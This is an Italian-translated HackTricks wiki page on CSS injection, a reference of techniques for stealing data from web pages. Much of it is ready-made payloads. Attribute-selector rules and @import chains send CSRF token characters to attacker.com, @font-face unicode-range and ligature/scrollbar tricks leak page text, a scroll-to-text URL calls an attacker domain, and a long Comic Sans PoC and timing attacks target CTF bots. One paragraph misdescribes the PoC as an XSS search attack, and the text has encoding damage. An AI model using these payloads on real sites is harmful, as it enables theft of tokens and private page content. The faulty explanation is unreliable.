# Iniezione CSS

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su GitHub.

</details>

## Iniezione CSS

### Selettore di attributi

I selettori CSS sono creati per corrispondere ai valori degli attributi `name` e `value` di un elemento `input`. Se l'attributo `value` dell'elemento `input` inizia con un carattere specifico, viene caricata una risorsa esterna predefinita:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
Tuttavia, questo approccio presenta un limite quando si tratta di elementi di input nascosti (`type="hidden"`) perch√© gli elementi nascosti non caricano gli sfondi.

#### Bypass per gli Elementi Nascosti

Per aggirare questo limite, √® possibile prendere di mira un elemento fratello successivo utilizzando il combinatore generale di fratelli `~`. La regola CSS si applica quindi a tutti i fratelli che seguono l'elemento di input nascosto, facendo caricare l'immagine di sfondo:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
Un esempio pratico di sfruttamento di questa tecnica √® dettagliato nel frammento di codice fornito. Puoi visualizzarlo [qui](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Prerequisiti per l'Injection CSS

Perch√© la tecnica di Injection CSS sia efficace, devono essere soddisfatte determinate condizioni:

1. **Lunghezza del Payload**: il vettore di injection CSS deve supportare payload sufficientemente lunghi per ospitare i selettori creati.
2. **Rivalutazione CSS**: √® necessario avere la possibilit√† di inquadrare la pagina, che √® necessaria per innescare la rivalutazione del CSS con i payload appena generati.
3. **Risorse Esterne**: la tecnica presuppone la possibilit√† di utilizzare immagini ospitate esternamente. Ci√≤ potrebbe essere limitato dalla Content Security Policy (CSP) del sito.

### Selettore di Attributi Ciechi

Come [**spiegato in questo post**](https://portswigger.net/research/blind-css-exfiltration), √® possibile combinare i selettori **`:has`** e **`:not`** per identificare il contenuto anche da elementi ciechi. Questo √® molto utile quando non si ha idea di cosa sia all'interno della pagina web che carica l'injection CSS.\
√à anche possibile utilizzare questi selettori per estrarre informazioni da diversi blocchi dello stesso tipo, come in:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
Combina questo con la seguente tecnica **@import**, √® possibile esfiltrare molte informazioni utilizzando l'iniezione CSS da pagine cieche con [blind-css-exfiltration](https://github.com/hackvertor/blind-css-exfiltration).

### @import

La tecnica precedente ha alcuni svantaggi, controlla i prerequisiti. Devi essere in grado di **inviare pi√π link alla vittima**, oppure devi essere in grado di **inserire l'iframe nella pagina vulnerabile all'iniezione CSS**.

Tuttavia, c'√® un'altra tecnica intelligente che utilizza **CSS `@import`** per migliorare la qualit√† della tecnica.

Questo √® stato mostrato per la prima volta da [Pepe Vila](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) e funziona cos√¨:

Invece di caricare la stessa pagina pi√π volte con decine di payload diversi ogni volta (come nella tecnica precedente), **caricheremo la pagina solo una volta e solo con un import verso il server degli attaccanti** (questo √® il payload da inviare alla vittima):
```css
@import url('//attacker.com:5001/start?');
```
1. L'importazione **ricever√† uno script CSS** dagli attaccanti e il **browser lo caricher√†**.
2. La prima parte dello script CSS che l'attaccante invier√† √® **un'altra `@import` verso il server degli attaccanti**.
1. Il server degli attaccanti non risponder√† ancora a questa richiesta, poich√© vogliamo rivelare alcuni caratteri e quindi rispondere a questa importazione con il payload per rivelare quelli successivi.
3. La seconda e pi√π grande parte del payload sar√† un **payload di perdita di selettore di attributo**.
1. Questo invier√† al server degli attaccanti il **primo carattere del segreto e l'ultimo**.
4. Una volta che il server degli attaccanti ha ricevuto il **primo e l'ultimo carattere del segreto**, risponder√† all'importazione richiesta nel passaggio 2.
1. La risposta sar√† esattamente la stessa dei **passaggi 2, 3 e 4**, ma questa volta cercher√† di **trovare il secondo carattere del segreto e poi il penultimo**.

L'attaccante **seguir√† questo ciclo fino a riuscire a rivelare completamente il segreto**.

Puoi trovare il [**codice di Pepe Vila per sfruttare questo qui**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) o puoi trovare quasi lo [**stesso codice ma commentato qui**](./#css-injection)

{% hint style="info" %}
Lo script cercher√† di scoprire 2 caratteri ogni volta (dall'inizio e dalla fine) perch√© il selettore di attributi consente di fare cose come:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Questo permette allo script di rivelare il segreto pi√π velocemente.
{% endhint %}

{% hint style="warning" %}
A volte lo script **non rileva correttamente che il prefisso + suffisso scoperto √® gi√† la flag completa** e continuer√† in avanti (nel prefisso) e all'indietro (nel suffisso) e ad un certo punto si bloccher√†.\
Niente paura, basta controllare l'**output** perch√© **puoi vedere la flag l√¨**.
{% endhint %}

### Altri selettori

Altri modi per accedere alle parti del DOM con **selettori CSS**:

* **`.classe-da-cercare:nth-child(2)`**: Questo cercher√† il secondo elemento con classe "classe-da-cercare" nel DOM.
*   Selettore **`:empty`**: Usato ad esempio in [**questo writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### XS-Search basato su errori

**Riferimento:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

L'intenzione generale √® **utilizzare un font personalizzato da un endpoint controllato** e assicurarsi che **il testo (in questo caso, 'A') venga visualizzato solo con questo font se la risorsa specificata (`favicon.ico`) non pu√≤ essere caricata**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Utilizzo di un Font Personalizzato**:
- Un font personalizzato viene definito utilizzando la regola `@font-face` all'interno di un tag `<style>` nella sezione `<head>`.
- Il font viene chiamato `poc` e viene recuperato da un endpoint esterno (`http://attacker.com/?leak`).
- La propriet√† `unicode-range` √® impostata su `U+0041`, mirando al carattere Unicode specifico 'A'.

2. **Elemento Oggetto con Testo di Riserva**:
- Viene creato un elemento `<object>` con `id="poc0"` nella sezione `<body>`. Questo elemento cerca di caricare una risorsa da `http://192.168.0.1/favicon.ico`.
- Il `font-family` per questo elemento √® impostato su `'poc'`, come definito nella sezione `<style>`.
- Se la risorsa (`favicon.ico`) non riesce a caricare, viene visualizzato il contenuto di riserva (la lettera 'A') all'interno del tag `<object>`.
- Il contenuto di riserva ('A') verr√† visualizzato utilizzando il font personalizzato `poc` se la risorsa esterna non pu√≤ essere caricata.

### Stilizzazione del Frammento di Testo di Scorrimento

La pseudo-classe **`:target`** viene utilizzata per selezionare un elemento mirato da un **frammento URL**, come specificato nella [specifica CSS Selectors Level 4](https://drafts.csswg.org/selectors-4/#the-target-pseudo). √à importante comprendere che `::target-text` non corrisponde a nessun elemento a meno che il testo non sia esplicitamente mirato dal frammento.

Sorge una preoccupazione per la sicurezza quando gli attaccanti sfruttano la funzionalit√† di **frammento di testo di scorrimento**, consentendo loro di confermare la presenza di un testo specifico su una pagina web caricando una risorsa dal loro server tramite l'iniezione HTML. Il metodo prevede l'iniezione di una regola CSS come questa:
```css
:target::before { content : url(target.png) }
```
In tali scenari, se il testo "Amministratore" √® presente nella pagina, viene richiesta la risorsa `target.png` dal server, indicando la presenza del testo. Un'istanza di questo attacco pu√≤ essere eseguita attraverso un URL appositamente creato che incorpora il CSS iniettato insieme a un frammento di scorrimento al testo:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Qui, l'attacco manipola l'iniezione HTML per trasmettere il codice CSS, puntando al testo specifico "Amministratore" attraverso il frammento Scroll-to-text (`#:~:text=Amministratore`). Se il testo viene trovato, la risorsa indicata viene caricata, segnalando involontariamente la sua presenza all'attaccante.

Per mitigazione, si dovrebbero notare i seguenti punti:

1. **Corrispondenza STTF limitata**: il frammento Scroll-to-text (STTF) √® progettato per corrispondere solo a parole o frasi, limitando cos√¨ la sua capacit√† di rivelare segreti o token arbitrari.
2. **Restrizione ai contesti di navigazione di primo livello**: STTF funziona solo nei contesti di navigazione di primo livello e non funziona all'interno degli iframe, rendendo qualsiasi tentativo di sfruttamento pi√π evidente per l'utente.
3. **Necessit√† di attivazione da parte dell'utente**: STTF richiede un gesto di attivazione da parte dell'utente per funzionare, il che significa che gli attacchi sono fattibili solo attraverso navigazioni avviate dall'utente. Questo requisito mitiga considerevolmente il rischio che gli attacchi vengano automatizzati senza interazione dell'utente. Tuttavia, l'autore del post del blog evidenzia condizioni specifiche e bypass (ad esempio, ingegneria sociale, interazione con estensioni del browser diffuse) che potrebbero facilitare l'automazione dell'attacco.

La consapevolezza di questi meccanismi e delle potenziali vulnerabilit√† √® fondamentale per mantenere la sicurezza web e proteggersi da tattiche di sfruttamento simili.

Per ulteriori informazioni, consulta il rapporto originale: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Puoi controllare uno [**sfruttamento di questa tecnica per un CTF qui**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Puoi specificare **font esterni per valori unicode specifici** che verranno raccolti solo se quei valori unicode sono presenti nella pagina. Ad esempio:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
Quando si accede a questa pagina, Chrome e Firefox recuperano "?A" e "?B" perch√© il nodo di testo delle informazioni sensibili contiene i caratteri "A" e "B". Ma Chrome e Firefox non recuperano "?C" perch√© non contiene "C". Ci√≤ significa che siamo stati in grado di leggere "A" e "B".

### Esfiltrazione del nodo di testo (I): ligature <a href="#esfiltrazione-del-nodo-di-testo-i-ligature" id="esfiltrazione-del-nodo-di-testo-i-ligature"></a>

**Riferimento:** [Wykradanie danych w ≈õwietnym stylu ‚Äì czyli jak wykorzystaƒá CSS-y do atak√≥w na webaplikacjƒô](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

La tecnica descritta consiste nell'estrazione del testo da un nodo sfruttando le ligature dei caratteri e monitorando le variazioni di larghezza. Il processo prevede diversi passaggi:

1. **Creazione di font personalizzati**:
- I font SVG vengono creati con glifi che hanno l'attributo `horiz-adv-x`, che imposta una larghezza elevata per un glifo che rappresenta una sequenza di due caratteri.
- Esempio di glifo SVG: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, dove "XY" indica una sequenza di due caratteri.
- Questi font vengono quindi convertiti nel formato woff utilizzando fontforge.

2. **Rilevamento delle variazioni di larghezza**:
- Il CSS viene utilizzato per garantire che il testo non venga a capo (`white-space: nowrap`) e per personalizzare lo stile della barra di scorrimento.
- L'apparizione di una barra di scorrimento orizzontale, stilizzata in modo distintivo, funge da indicatore (oracolo) che una specifica ligatura, e quindi una specifica sequenza di caratteri, √® presente nel testo.
- Il CSS coinvolto:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Processo di sfruttamento**:
- **Passaggio 1**: Vengono creati font per coppie di caratteri con larghezza considerevole.
- **Passaggio 2**: Viene utilizzato un trucco basato sulla barra di scorrimento per rilevare quando viene visualizzato il glifo di larghezza elevata (ligatura per una coppia di caratteri), indicando la presenza della sequenza di caratteri.
- **Passaggio 3**: Dopo aver rilevato una ligatura, vengono generati nuovi glifi che rappresentano sequenze di tre caratteri, incorporando la coppia rilevata e aggiungendo un carattere precedente o successivo.
- **Passaggio 4**: Viene effettuato il rilevamento della ligatura di tre caratteri.
- **Passaggio 5**: Il processo si ripete, rivelando progressivamente l'intero testo.

4. **Ottimizzazione**:
- Il metodo di inizializzazione attuale utilizzando `<meta refresh=...` non √® ottimale.
- Un approccio pi√π efficiente potrebbe coinvolgere il trucco `@import` del CSS, migliorando le prestazioni dello sfruttamento.

### Esfiltrazione del nodo di testo (II): leak del charset con un font predefinito (senza richiedere risorse esterne) <a href="#esfiltrazione-del-nodo-di-testo-ii-leak-del-charset-con-un-font-predefinito" id="esfiltrazione-del-nodo-di-testo-ii-leak-del-charset-con-un-font-predefinito"></a>

**Riferimento:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Questo trucco √® stato pubblicato in questa [**discussione di Slackers**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). Il charset utilizzato in un nodo di testo pu√≤ essere esfiltrato **utilizzando i font predefiniti** installati nel browser: non sono necessari font esterni o personalizzati.

Il concetto si basa sull'utilizzo di un'animazione per espandere incrementalmente la larghezza di un `div`, consentendo a un carattere alla volta di passare dalla parte 'suffisso' del testo alla parte 'prefisso'. Questo processo divide efficacemente il testo in due sezioni:

1. **Prefisso**: La linea iniziale.
2. **Suffisso**: Le linee successive.

Le fasi di transizione dei caratteri appaiono come segue:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


Durante questa transizione, viene utilizzato il **trucco unicode-range** per identificare ogni nuovo carattere mentre si unisce al prefisso. Ci√≤ viene realizzato passando al font Comic Sans, che √® notevolmente pi√π alto del font predefinito, innescando di conseguenza una barra di scorrimento verticale. L'apparizione di questa barra di scorrimento rivela indirettamente la presenza di un nuovo carattere nel prefisso.

Sebbene questo metodo consenta la rilevazione di caratteri unici man mano che appaiono, non specifica quale carattere viene ripetuto, ma solo che si √® verificata una ripetizione.

{% hint style="info" %}
Fondamentalmente, **unicode-range viene utilizzato per rilevare un carattere**, ma poich√© non vogliamo caricare un font esterno, dobbiamo trovare un altro modo.\
Quando il **carattere** viene **trovato**, viene assegnato il font preinstallato **Comic Sans**, che rende il carattere **pi√π grande** e **attiva una barra di scorrimento** che **esfila il carattere trovato**.
{% endhint %}

Controlla il codice estratto dal PoC:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```

Il codice sopra mostra un esempio di iniezione CSS per sfruttare una vulnerabilit√† di ricerca di cross-site scripting (XSS). Questo tipo di attacco sfrutta una falla nella gestione dei dati di input per inserire codice malevolo all'interno di una pagina web. Nel caso specifico, l'attaccante sta cercando di modificare la larghezza di un elemento HTML utilizzando le regole CSS specificate. Inoltre, viene utilizzato un canale laterale per nascondere l'attacco, sfruttando la propriet√† `::-webkit-scrollbar` di WebKit per modificare l'aspetto della barra di scorrimento.
### Esfiltrazione del nodo di testo (III): rivelare il set di caratteri con un font predefinito nascondendo elementi (senza richiedere risorse esterne) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Riferimento:** Questo viene menzionato come [una soluzione non riuscita in questo articolo](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Questo caso √® molto simile al precedente, tuttavia, in questo caso l'obiettivo di rendere specifici **caratteri pi√π grandi degli altri √® nascondere qualcosa** come un pulsante per evitare che venga premuto dal bot o un'immagine che non verr√† caricata. Quindi potremmo misurare l'azione (o l'assenza di azione) e sapere se un carattere specifico √® presente nel testo.

### Esfiltrazione del nodo di testo (III): rivelare il set di caratteri tramite il tempo di cache (senza richiedere risorse esterne) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Riferimento:** Questo viene menzionato come [una soluzione non riuscita in questo articolo](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

In questo caso, potremmo provare a rivelare se un carattere √® presente nel testo caricando un falso font dalla stessa origine:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Se c'√® una corrispondenza, il **font verr√† caricato da `/static/bootstrap.min.css?q=1`**. Anche se non verr√† caricato correttamente, il **browser dovrebbe memorizzarlo nella cache**, e anche se non c'√® una cache, c'√® un meccanismo di **304 not modified**, quindi la **risposta dovrebbe essere pi√π veloce** rispetto ad altre cose.

Tuttavia, se la differenza di tempo tra la risposta memorizzata nella cache e quella non memorizzata non √® abbastanza grande, ci√≤ non sar√† utile. Ad esempio, l'autore ha menzionato: Tuttavia, dopo i test, ho scoperto che il primo problema √® che la velocit√† non √® molto diversa, e il secondo problema √® che il bot utilizza il flag `disk-cache-size=1`, il che √® davvero premuroso.

### Esfiltrazione del nodo di testo (III): rivelazione del set di caratteri tramite il caricamento temporizzato di centinaia di "font" locali (senza richiedere risorse esterne) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Riferimento:** Questo viene menzionato come [una soluzione non riuscita in questo articolo](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

In questo caso √® possibile indicare al **CSS di caricare centinaia di font falsi** dalla stessa origine quando si verifica una corrispondenza. In questo modo √® possibile **misurare il tempo** impiegato e scoprire se un carattere appare o meno con qualcosa del genere:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
E il codice del bot √® il seguente:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Quindi, se il font non corrisponde, ci si aspetta che il tempo di risposta durante la visita al bot sia di circa 30 secondi. Tuttavia, se c'√® una corrispondenza di font, verranno inviate richieste multiple per recuperare il font, causando un'attivit√† continua sulla rete. Di conseguenza, ci vorr√† pi√π tempo per soddisfare la condizione di stop e ricevere la risposta. Pertanto, il tempo di risposta pu√≤ essere utilizzato come indicatore per determinare se c'√® una corrispondenza di font.

## Riferimenti

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
